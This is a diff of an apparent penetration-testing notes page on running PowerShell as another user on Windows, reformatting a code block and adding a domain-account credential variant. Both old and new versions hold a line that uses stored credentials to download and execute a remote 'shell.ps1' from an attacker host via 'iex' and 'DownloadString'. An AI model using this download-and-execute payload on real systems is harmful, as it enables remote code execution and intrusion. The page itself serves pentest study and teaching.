@@ -23,14 +23,14 @@ runas /user:corp\j0r1an powershell  # domain
 
 The above only works in an RDP setting where you interactively type the password. For shells instead, you can use PowerShell to create a new process with your credentials:
 
-{% code title="sudo using PowerShell" overflow="wrap" %}
-```powershell
-$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential("$USERNAME", $pass)
-
-Start-Process -Credential ($cred) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://$IP:8000/shell.ps1')"  # Run your payload here
-```
-{% endcode %}
+<pre class="language-powershell" data-title="sudo using PowerShell" data-overflow="wrap"><code class="lang-powershell"><strong>$pass = ConvertTo-SecureString '$PASSWORD' -AsPlainText -Force
+</strong># 1. Local account
+<strong>$c = New-Object System.Management.Automation.PSCredential("$USERNAME", $pass)
+</strong># 2. Domain account
+<strong>$c = New-Object System.Management.Automation.PSCredential("$DOMAIN\$USERNAME", $pass)
+</strong>
+<strong>Start-Process -Credential ($c) -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://$IP:8000/shell.ps1')"  # Run your payload here
+</strong></code></pre>
 
 ## Privileges
 
